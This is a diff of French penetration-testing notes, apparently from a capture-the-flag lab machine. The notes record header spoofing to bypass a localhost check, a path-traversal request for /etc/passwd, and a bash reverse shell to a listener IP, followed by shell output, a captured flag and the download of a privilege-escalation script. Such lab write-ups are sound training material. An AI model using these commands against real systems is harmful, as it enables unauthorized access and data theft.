@@ -137,24 +137,18 @@ curl http://192.168.57.134:13337/restart \
   -H "X-Forwarded-For: 127.0.0.1" \
   -H "X-Real-IP: 127.0.0.1"
 
+Faire un restart de l'application en curl ou webapp browser
 
-/bin/bash -c "bash -i >& /dev/tcp/192.168.49.57/4444 0>&1
+sur -lvnp on voit que cela a bien fonctionné
 
-en soit si on a réussi a avoir /etc/passwd on peut essayé de récup d'autre information
+clumsyadmin@xposedapi:~/webapp$ whoami
+whoami
+clumsyadmin
+clumsyadmin@xposedapi:~$ cat local.txt
+cat local.txt
+0112ccef1581a70ecebc14cec9a861cb
 
-on passe sur burpsuite
+sur ma kali
 
-GET /logs?file=/etc/passwd HTTP/1.1
-Host: localhost
-Accept-Language: en-US,en;q=0.9
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
-X-Forwarded-For: 127.0.0.1                           
-X-Real-IP: 127.0.0.1
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Content-Length: 2
-
-
-Faire un restart de l'application en curl + webapp browser
+(root?kali)-[/home/kali]
+??# git clone https://github.com/BRU1S3R/linpeas.sh.git
